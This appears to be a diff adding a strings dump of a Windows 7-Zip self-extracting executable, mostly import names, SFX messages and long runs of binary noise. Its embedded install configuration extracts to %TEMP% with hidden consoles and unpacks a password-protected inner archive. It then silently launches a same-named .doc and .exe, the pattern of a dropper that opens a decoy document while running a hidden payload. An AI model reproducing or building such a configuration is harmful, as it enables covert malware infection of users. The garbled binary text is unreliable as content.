@@ -1,0 +1,1102 @@
+!Require Windows
+`.rdata
+@.data
+VWt"f9
+QQSVWh`
+PVVVVVVVhP
+hSVWj@
+PSSSSSSh 
+ItaIt4IuQf
+@@f98u
+1t,HtHt
+9u<t V
+MLQPh,
+9u,u#V
+CCf9;u
+_8Whcn@
+9^8u W
+9nHu%3
+twHtPHt H
+QQSUVW
+_^][YY
+A 9q(v
+|_^][Y
+u?9L$,
+\$(#\$T
+T$4u ;l$(r"
+|$(+L$4+
+L$$;L$ds$
+T$$_^]
+L$`_^]
+u<9F0u
+D$(;D$
+D$(;D$
+L$(;L$
+9F _^]
+9nLtq;
+D$ 9F$
+T$0_^]
+D$0_^]
+L$0_^]
+D$0_^]
+L$0_^]
+;wTt+P
+;w(t?P
+D$ )Ft
+D$,_^]
+D$,_^]
+L$,_^]
+T$,_^]
+ND;NHt&P
+8D$<us8D$,t
+9L$ u6
+u39^hu
+FH;F u
+FD;FLr
+FP;FXu
+Et9}tu
+M49U4w
+Et9EHrD
+EL;Ets+
+E(9ELs
+OtwOt,Ot
+t3OOt$
+Ex9Mxr
+Ux@;G\
+E|@;E@r
+El+E|;E(t
+Et@;E|r
+YG;~xr
+SetThreadPreferredUILanguages
+SetProcessPreferredUILanguages
+IMAGES
+STATIC
+GetNativeSystemInfo
+Wow64RevertWow64FsRedirection
+Wow64DisableWow64FsRedirection
+:Language:%u
+riched20
+Enter password:
+Insufficient physical memory.
+Extracting may take a long time.
+Do you want to continue?
+Not enough free space for extracting.
+Do you want to continue?
+: warning
+7z SFX: 
+7z SFX: warning
+0x%08x
+0x%08x
+Application error:
+Exception code:
+0x%08x
+Address:
+0x%08x
+Exception data:
+Finish
+Error in command line:
+ "%s".
+Could not overwrite file "%s".
+ "%s".
+Could not create file "%s".
+Cancel
+ "HelpText" 
+No "HelpText" in the configuration file.
+Really cancel the installation?
+Extraction path:
+Extraction path
+7-Zip: 
+7-Zip: Extraction error.
+7-Zip: 
+ 0x%08X.
+7-Zip: Internal error, code 0x%08X.
+7-Zip: 
+7-Zip: Internal error, code %u.
+7-Zip: 
+7-Zip: Data error.
+The archive is corrupted, or invalid password was entered.
+7-Zip: 
+ (CRC).
+7-Zip: CRC error.
+7-Zip: 
+7-Zip: Unsupported method.
+ "%s".
+Error during execution "%s".
+ "setup.exe" 
+Could not find "setup.exe".
+ "%s" 
+Could not find command for "%s".
+ "%s".
+Could not delete file or folder "%s".
+ "%s".
+Could not create folder "%s".
+Error in line %d of configuration data:
+Could not write SFX configuration.
+Could not read SFX configuration or configuration not found.
+Non 7z archive.
+ "%s".
+Could not open archive file "%s".
+Could not get SFX filename.
+Extracting
+: error
+7z SFX: 
+7z SFX: error
+7z SFX
+ - Copyright (c) 2005-2016 
+1.6.1  [x86] 
+ 3873 (5 
+ 2016)
+ 7-Zip - Copyright (c) 1999-2015 
+15.14  (31 
+ 2015)
+SFX module - Copyright (c) 2005-2016 Oleg Scherbakov
+1.6.1  [x86] build 3873 (March 5, 2016)
+7-Zip archiver - Copyright (c) 1999-2015 Igor Pavlov
+15.14  (December 31, 2015)
+Supported methods and filters, build options:
+kernel32
+Could not allocate memory
+7-Zip SFX
+Sorry, this program requires Microsoft Windows 2000 or later.
+123456789ABCDEFGHJKMNPQRSTUVWXYZ
+SetWindowTheme
+uxtheme
+out of memory
+GenuineIntelAuthenticAMDCentaurHauls
+COMCTL32.dll
+SHGetSpecialFolderPathW
+ShellExecuteExW
+ShellExecuteW
+SHGetMalloc
+SHGetPathFromIDListW
+SHBrowseForFolderW
+SHGetFileInfoW
+SHELL32.dll
+DeleteDC
+GetCurrentObject
+StretchBlt
+SetStretchBltMode
+CreateCompatibleBitmap
+SelectObject
+CreateCompatibleDC
+GetObjectW
+GetDeviceCaps
+DeleteObject
+CreateFontIndirectW
+GDI32.dll
+FreeSid
+CheckTokenMembership
+AllocateAndInitializeSid
+ADVAPI32.dll
+MessageBoxW
+wsprintfW
+EndDialog
+SendMessageW
+CharUpperW
+KillTimer
+DispatchMessageW
+GetMessageW
+SetTimer
+SetWindowPos
+GetWindowRect
+GetDesktopWindow
+CreateWindowExW
+ScreenToClient
+GetParent
+CopyImage
+ReleaseDC
+GetWindowDC
+GetMenu
+GetWindowLongW
+GetClassNameA
+wsprintfA
+GetWindowTextW
+GetWindowTextLengthW
+SetWindowTextW
+GetSysColor
+DestroyWindow
+MessageBoxA
+BringWindowToTop
+ShowWindow
+GetKeyState
+GetDlgItem
+GetClientRect
+SetWindowLongW
+UnhookWindowsHookEx
+SetFocus
+GetSystemMetrics
+SystemParametersInfoW
+DrawTextW
+ClientToScreen
+GetWindow
+DialogBoxIndirectParamW
+DrawIconEx
+CallWindowProcW
+DefWindowProcW
+CallNextHookEx
+PtInRect
+SetWindowsHookExW
+LoadImageW
+LoadIconW
+MessageBeep
+EnableWindow
+IsWindow
+EnableMenuItem
+GetSystemMenu
+CreateWindowExA
+wvsprintfW
+USER32.dll
+CreateStreamOnHGlobal
+CoInitialize
+CoCreateInstance
+ole32.dll
+OLEAUT32.dll
+ExitProcess
+lstrcatW
+GetDiskFreeSpaceExW
+SetFileAttributesW
+SetLastError
+GetExitCodeThread
+WaitForSingleObject
+CreateThread
+GetLastError
+SystemTimeToFileTime
+GetLocalTime
+GetFileAttributesW
+CreateDirectoryW
+lstrlenA
+WriteFile
+GetStdHandle
+GetModuleHandleW
+GetProcAddress
+LockResource
+LoadResource
+SizeofResource
+FindResourceExA
+MulDiv
+GlobalFree
+GlobalAlloc
+lstrcmpiA
+GetSystemDefaultLCID
+GetSystemDefaultUILanguage
+GetUserDefaultUILanguage
+MultiByteToWideChar
+GetLocaleInfoW
+lstrcmpiW
+GetEnvironmentVariableW
+RemoveDirectoryW
+SetCurrentDirectoryW
+FindClose
+FindNextFileW
+DeleteFileW
+lstrcmpW
+FindFirstFileW
+WideCharToMultiByte
+CompareFileTime
+ExpandEnvironmentStringsW
+GetSystemTimeAsFileTime
+lstrlenW
+SetThreadLocale
+LoadLibraryA
+CloseHandle
+GetExitCodeProcess
+GetQueuedCompletionStatus
+SetInformationJobObject
+CreateIoCompletionPort
+AssignProcessToJobObject
+ResumeThread
+CreateJobObjectW
+CreateProcessW
+GetStartupInfoW
+GetCommandLineW
+GetTempPathW
+SetEnvironmentVariableW
+CreateFileW
+GetDriveTypeW
+SetProcessWorkingSetSize
+GetCurrentProcess
+GetModuleFileNameW
+GetVersionExW
+CreateEventW
+SetEvent
+ResetEvent
+InitializeCriticalSection
+GetCurrentThreadId
+GetSystemDirectoryW
+TerminateThread
+SuspendThread
+IsBadReadPtr
+LocalFree
+lstrcpyW
+FormatMessageW
+DeleteCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+GetFileSize
+SetFilePointer
+ReadFile
+SetFileTime
+SetEndOfFile
+GetFileInformationByHandle
+WaitForMultipleObjects
+VirtualAlloc
+VirtualFree
+KERNEL32.dll
+??3@YAXPAX@Z
+_purecall
+memcmp
+??2@YAPAXI@Z
+memmove
+memcpy
+strncpy
+wcsncpy
+wcsncmp
+strncmp
+_wcsnicmp
+memset
+?_set_new_handler@@YAP6AHI@ZP6AHI@Z@Z
+_EH_prolog
+_beginthreadex
+wcscmp
+_CxxThrowException
+wcsstr
+malloc
+MSVCRT.dll
+__dllonexit
+_onexit
+??1type_info@@UAE@XZ
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+GetModuleHandleA
+GetStartupInfoA
+,!@Install@!UTF-8!
+,!@InstallEnd@!
+.?AVCInArchiveException@N7z@NArchive@@
+.?AVCUnsupportedFeatureException@N7z@NArchive@@
+.?AVtype_info@@
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+<assemblyIdentity version="1.6.0.3873" name="7-Zip.SfxMod" type="win32"></assemblyIdentity>
+<dependency><dependentAssembly>
+<assemblyIdentity type="win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0" processorArchitecture="X86" publicKeyToken="6595b64144ccf1df"></assemblyIdentity>
+</dependentAssembly></dependency>
+<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security>
+<requestedPrivileges><requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel></requestedPrivileges>
+</security></trustInfo>
+<compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"><application>
+<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"></supportedOS>
+</application></compatibility>
+</assembly>
+;!@Install@!UTF-8!
+InstallPath="%TEMP%"
+OverwriteMode="1"
+RunProgram="hidcon:cmd.exe /c echo 75BB576D00D3EF97"
+RunProgram="hidcon:cmd.exe /c ren \"%TEMP%\\75BB57\" 7za.exe"
+RunProgram="hidcon:\"%%T\\7za.exe\" e \"%%T\\6D00D3EF97\" -y -p6D00D3EF97"
+RunProgram="hidcon:forcenowait:\"%%T\\6D00D3EF97.doc\""
+RunProgram="hidcon:forcenowait:\"%%T\\6D00D3EF97.exe\""
+GUIMode="2"
+;!@InstallEnd@!7z
+O unJd
+`yrBt)
+gyc.0H0
+qQO^`e6e
+84>I#>
+b=ve&OfE
+)9NP+.
+1]5Z'Fi
++ \/^f
+Mi@pMx
+a/AYUs;
+~o=v7:
+GEI~6R
+C9' EhV
+PmZ?*U
+MBk ,d&HAd
+==+d{."
+xhki/M
+v~+pbtT<
+gm!%}d
+^G!0eIf
+r3y#,8
+~+hU$A
+y2BmV)zx50#yE1,
+;h|ey3d&;5gvZ
+I=D"G>!
+j0zTal
+dQjorD
+=)&L}g
+NlFyzv
+wn+PKRk
+cNm6Q5
+7*4|Wn
+:/}'d*
+,ef"5>DA^7>
+>`rE&>OS
+0#iFu+
+7{p3X`Bs<
+A%%uiK
+D|)a0<!W
+uu3(U/
+xtyf#}
+^JvV&p
+Qhg@@+iu
+QmB-L;
+#IwDBh
+t1kU2>zq
+RpGl|MEb
+dWOF^Z
+yCg;={
+:S/~KB.3
+dyY_Me
+,qf-ndiG>
+&,]% 9
+01|'YCw
+>fi3,'
+Z|Vdb_
+t.UO!k
+`dL|A:Z?b:
+)-OVgX
+|D^;51K
+S}TV1
+vT$h`w
+!I9`CA
+bX;"%h
+WYK2);l
+ol!}5`,
+G#aYwF
+|nzG{]
+v(J}aqD
+vh|ow2
+O2$G?i
+lbvtO
+|~]H3J
+iafe)g1
+lG&rcP
+OAkEXd
+k|?Oc>
++&%uQ|
+IO?$!u
+@$E/j!
+^sH,:MS
+9jHra#0
+$Aiiyj
+ o|?eG
+j}:!ki
+>h5vT_v
+[Rx0SI
+7CNVS<
+wUO0ZO
+A~o3-b
+GL'mIXF
+gH54yD
+B`a+|?
+[h\]:f
+i" w?\
+Qq1U3AN
+lhfj()&
+6@g!=m:
+|1Hq)-Vr
+~CR_<?
+a{=.,4
+ifVY.|
+}%aS*9D
+YW~rR9
+?W_|x)
+g[jY@T
+][ VF0u
+g{i4qxf
+ Bf[t3
+~0s8M1
+<E!1*SG
+\!;{%;Tj];
+%lVQI6L
+i!:f(z7
+z:f#`-
+m)lxXb<yw
+\PbHLO
+9Z(9@{
+gJwXsOgW
+5A#RdI
+SBOc\zd
+x|UQRc
+52XD7.L_
+;IIJ{*
+UPw6pPI|
+C["TW.
+&ZV1w@
+K:YI.6
+}nKviN
+_kl:q$
+xn`k(H
+^9bc1"
+A'v38yd
+8Ay=N
+EI^Ac[wQ-u
+];p.IAn
+Lr]HfR
+vAgJR'
+\&.l)`
+1Z)"uG
+qc\,T%
+R!a:2S
+oO{5: wF
+NK9F/Nz
+Rgqh$R
+5CmIe:
+cpUbU
+A$h\80
+!41XwudI
+e8S~8l
+7w#MzB<z
+l|9C82]
+CC2hyP
+>(>8>H
+JL=xbs
+s)%!a)
+S6Dy)w
+p\J84.
+>O1(BP
+{\>~u!
+,5aU:,G
+7+Ja"d
+';0{6*
+yLH "8
+)R/2s9
+r-Nx.v 
+ljkNj4
+ -9H65^
+&\X.,)
+E;bT+~
+6[O7tp
+5.cJ$$
+>2}*fp
+N{wCAF
+/&nQ]
+8! 1JTn
+g,8)ZK
+4Bt:<{nh
+ynols<
+|~|P?.
+=$z;O]
+:Vq'h{
+4|sZg_
+v"XVY:X
+<$)Np\
+[ANq)PN
+%G8`zbg
+*q0^?
+]-AW12Q
+[LYXR0
+./U0Mfl
+{q<Y$Q
+r/7$*u
+oqjB{fS
+a{/W}V6
+"SIU>~
+xPLo/I
+^jE,{u
+E_}=q2
+#~r8sv[
+Il3Ym
+,S,s}!N#0
+E</Ar,
+Q{Tg$
+:pWHXh
+iLz[a0
+P ':_?
+ldg~k9
+YoN%.sR
+>FT}Q(
+-AS/)
+QUv'4/
+Nq>9pc!
+US)#_ht|=
+=x"{7L
+L9![,J
+*l4#<)
+57.93%+g\7
+J&1E9v
+&LB1IH
+)l"&\B
+aF5#Z&
+/zoZf=Ea\
+:/M)\6
+1IkH(a
+~dUn/6
+*klkK1
+Ua81'@
+8yJbD,f8
+|QCMXp
+OwA*f5:3
+M,)zR9
+AQl5ht
+t|uJUD 
+ :`GQz
+/ XHO*P
+$p^'G~q
+1]2ZCLr
+<{pnIe[
+I[&F2R
+2!zdh_
+/w_%6
+@x<$mo 
+SmsBez#
+LEEUvqo28
+/&qKl4v
+4Y}n+x
+WdDu$OBz
+=!@!oT
+%$zP,}
+^Z}Qm
+KZd#le?&1
+)q}~zt
+C1:$ o
+x2qS9a
+yCas$V
+3|%A npX
+fsjq.C
+jW65O:p
+6G2=z-
+fAkyb{
+EY[k#.
+5v7YI 
+V|&L,h 
+pCnJx]
+$[gM{Q
+y`WEp
+{r-s2w
+i?&9T6$uv5V
+H]~YjFcW
+|N.a#@
+I:*iU$Gl
+%Sj%sWc
+w}CG7!
+zNTI<O
+M`Rk_G
+3i|u^b
+>.!bO&
+>#!81H2
+<Lf+>d
+ddCH_c
+nH)z?j:RH
+7.*`*XB
+VD6LI{_
+P4LX?@x8
+[,B`;:
+*@WWWg
+v`/ve0g
+Ioslhb
+@L+t%Q)
+%r$"&+l
+%A<0PL?X
+6s=Erw
+C{PbKN
+g((rG?j
+?c>L^rP
+DqEgjM
+%,vG-b
+/l#!kv
++:?f"Rv7
+|#H<UE
+.`m\uvYQ,.
+8&(fN
+1nhg\j
+550(90F3#
+O/.[xM
+a-$uA?
+=ysoDS
+0UtG/5
+,)"O5Q
+n>O::5
+7 P+\1%%
+ 1(>{*=v
+KVuxAL
+u?<$t%/
+JKu$0{.3
+@*G]Ir
+\Y''1}K
+t(_{R 
+^-h$X=+37
+D7HJK!
+IIl"5|G@
+#U_H$7
+{Y@Uy)
+peAjv.pA
+P{3\Pj
+F)3S/Q
+RpMh3F
+3AZONU=
+^K_[Eg
+r5c_s&x
+?$;$io
+mV(}#>
+c_TG7e
+QBOs]A
+8RM5"{
+u\fINhB
+3B^/A$3
+BfBlj}
+|ex{^T
+x%wsHh
+wd$g\k
+[ )e$V
+9->9Do
+TzzsL~
+e L>&7
+XoAF9
+$OV>V~
+/'rB]"
+CnU^Q8#
+3<e1)@
+#kfW
+Z.6f[O-~
+o0cpG'i
+APj~lw
+(}RQs/p
++ntS2F
+dL?4-u
+!iTzI^Z
+U~f~U+?
+Hg8}7q,
+*F5(%a
++07Onm
+h{_).` 
+o7s!$5
+HNT!_JN[
+Sjaqfd:
+K9k.x
+\-xAnZ
+<zIk3xyo
+JR24((
+r`'(t~
+3$3?}~
+)Ai\b.;/IP
+6TYZB!
+nfOcTC-(
+(kZWC_
+Y%`Q-1
+?cFeONw
+o):lsG
+?=$kHZ
+~f~acR4d
+E@3hBQ+\`zd
+@"@n&8~Z
+A73vN.]
+N+n>MruC
+s{7E%4
+^##Q:a
++}3ZA*k|
+feX.t.H
+r<CE7{
+*M>($)P|)b
+D5=*Nj
+"Jmj9L|
+gf&31VQ
+on _A~
+0QIsA3)
+HV1cvL
+W8yZz_
+!z[sXV
+M+_S4ohtx
+S<_E=6A{v
+:xG{*$^
+zXgC(
+CIVT|f}$ua
+scpoz 
+.@o-$A9
+glfA|p
+)^G,@
+N30V>e
+ u@Pq7u-=
+Okn=B  
+/otAwA
+\okgt
+C?)d4Y
+\SKSg&yCR:
+/Q4Qkw
+]BQ`0U
+"V=V*|j
+!z:2oj
+0jBNa:k
+5m(K`sn
+ZE*:zu;
+V"yXHIO
+~v'FGQ;.
+wuGU|K
+a:Qp'u
+uC$E4]
+81>Ktht
+kk9r2N
+o~0LKR
+fal8y3cZ
+5^kN\)
+<Tqi5m
+W{1L3o
+g!a;2a
+S9]b8Lr
+mVk%9iES
+}&omQ 
+o"0B$|
+Z}*lc
+xV:3qw$
+O}MP5P
+`I^Ru>
+?~,:<O
+qzd,sPJ
+?]~h%fq
+hx8epy
+~'Q}vuSk
+Yc?iu*
+-61,}a-
+(mC_fO
+pzPEc.
+XFg+Cd
+)96=L2
+65x|A!qf
+2tp+wI
+244)tP|
+J*&C3:K
+rB3:lH
+_sji1a
+X;x*:w
+5n|nE:
+AW7T R
+z7\sG
+J!GUQ{Mn
+>&oCnQ
+$(T)YL6
+%w5x'w
+E{9VG0
+hmx7Y
+u/9mv3
+o>R?+aO
+[SdW94{_9
+Ai,]?oK
+JdPI?4
+$,Lv@F
+&w9(y#
++VSl1'
+~{I7FK0>
+=Ku=38x
+4v*{L!T
+7iFoL 
+8Hky58
+ZSbkV.
+wbkMfj
+X4r\s]
+[5OO94
+g!CZ7g06
+l_fM;O
+<>s}u@
+`6#uH~B
+Pg)@+KM
+;zA&1d
+Mf NyJ
+{S}sg9
+53!4~or
+csFU_t
+7r@2/mf
+:wQ'6)\
+Xexd:M
+o:f:m$a
+BY-X>h
+1k_6K$=
+uWmF>h rF
+/Ze*0]
+4?r.~s
+N>e-0$=
+wih=6y
+z&d-fwI/
+LG97w,M
+6Mfu\F
+ZU!!b[
+RZt&i8
+F2Omj#
+Y'&\<I
+AI9'*I/
+g?.6p|
+K3--ZL
+`SUHfh
+d2&u| -
+PYk[.]
+}JfO[3
+t. Azj
+3H-h):
+*Gc"hR,
+rW*n%_]!
+@Pj ik
+eu'Mn4
+Q1VAiE
+Q;k0+O
+;0~d3y
+6arDif_S
+Nls)1J
+z'8ec1
+x2{9=EUJ
+TnU4`h
++$zhU(sT
+.i1D.9D@
+:::k"-%
+8Hj{kQS
+*@Od"I
+NY|~c{
+NbjLO-
++lEM"]
+mKI4pa\
+S78zx6
+3BKC7N
+^"A16y
+ID)8J
+#0xTW-0f|
+>}}d\H
+X%0Q~7
+:EKG5hk
++t'~0HIw*
+fjmxPR
+(=C?ry
+^Lg&vx
+SUkL7x
+.{cKhv
+E~pg(EJ]
+);AVSe
+trgY,Sg
++%{X"V
+Z`Y/?5
+v WwbwB
+P#[iqj
+!2f3G;
+@57Eokf
+jN]I??
+1OK~!p
+eg!H`k0 
+v06Nv5'
+Y\9c|c9
+S&X'dy
+$8x6IIbE'
+Y%o$30G("
+Y"F2ZO
+?sJPl+
+;{C-R"
+!LQf_n
+VXVBV;
+_fZUV2
+e/5vJB$
+nlFzEd)
+Bc"R=
+E=twY5
+.2S*Zi
+K#G}=\b
+A6U%1-
+3tv|a]
+kE#<4Pk
+,FokP6
+-mx@D~%x
+}`Vxl=
+0IHL.,
+o/<Rt'
+UO*06L[
+d&IoS%
+]6{B&gc
+VQ->>Qia
+iuolR
+1++F3.
+R<Hl+b
+3OT,^d
+[-k+~W
+NQ OEe
+jJoP<g
+6$kDt3
+lT"G^cw
+he8X=}
+z'5Pcc
+QZ-*LA
+<6-;4cE7
+P .UY
+z\4%b(
+yYR3#z
+C!/B_g
+eRtRpC{
+L,.G x:F.
+\q$!DO&?
+UMv9%
+]\SJob
+tooltips_class32
+%04X%c%04X%c
+SfxString%d
+RichEdit20W
+SetEnvironment
+GUIFlags
+MiscFlags
+RunProgram
+AutoInstall
+Shortcut
+Delete
+ExecuteFile
+MyDocs
+MyDocuments
+UserDesktop
+CommonDocuments
+CommonDesktop
+@SfxFolder%02d
+VolumeNameStyle
+PasswordText
+PasswordTitle
+CancelPrompt
+ExtractPathText
+ExtractPathTitle
+ExtractPathWidth
+ExtractDialogWidth
+ExtractDialogText
+ExtractCancelText
+OverwriteMode
+GUIMode
+Progress
+ExtractTitle
+WarningTitle
+ErrorTitle
+@Directory
+BeginPrompt
+InstallPath
+SelfDelete
+HelpText
+FinishMessage
+ExecuteParameters
+BeginPromptTimeout
+%X - %03X - %03X - %03X - %03X
+Volumes
+sfxwaitall
+" goto Repeat
+if exist "
+:Repeat
+7ZSfx%03x.cmd
+forcenowait
+nowait
+hidcon
+waitall
+setup.exe
+7ZipSfx.%03x
+SfxAuthor
+SfxVarCmdLine1
+SfxVarCmdLine2
+sfxconfig
+sfxtest
+sfxelevation
+sfxversion
+sfxlang
+SfxVarSystemLanguage
+SfxVarCmdLine0
+SfxVarSystemPlatform
+SfxVarModulePlatform
+@ (%d%s)
+ 100%% 
+MS Shell Dlg
+msctls_progress32
